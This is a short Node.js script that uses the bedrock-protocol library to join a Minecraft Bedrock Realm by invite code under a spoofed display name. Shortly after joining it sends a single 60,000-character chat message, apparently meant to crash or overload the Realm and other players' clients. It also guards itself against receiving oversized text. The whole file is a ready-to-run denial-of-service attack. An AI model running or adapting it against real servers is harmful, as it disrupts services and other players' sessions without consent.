const bedrock = require('bedrock-protocol');
const crypto = require('crypto');

const code = 'NrTfeYsK9aB5KYU';
const msg = 'abc'

const client = bedrock.createClient({
  username: 'bot1',
  skinData: {
    ThirdPartyName: 'spoof name',
    ThirdPartyNameOnly: true,
  },
  realms: {
    realmInvite: code
  }
});

client.on('text', (packet) => {
  if (packet.message.toString().length > 1000){
    client.disconnect()
  }
});

client.on('disconnect', (packet) => {
  console.log(packet)
});

client.on('join', (packet) => {
  console.log('Joining')
});

client.on('start_game', (packet) => {
  setTimeout(() => { client.disconnect }, 2000)
});

client.on('start_game', (packet) => {
  console.log('Joined')
  setTimeout(() => {
    client.queue('text', {
      type: 'chat',
      needs_translation: false,
      source_name: client.username,
      message: msg.repeat(20000),
      filtered_message: '',
      xuid: '',
      platform_chat_id: ''
    });
  }, 1000)
});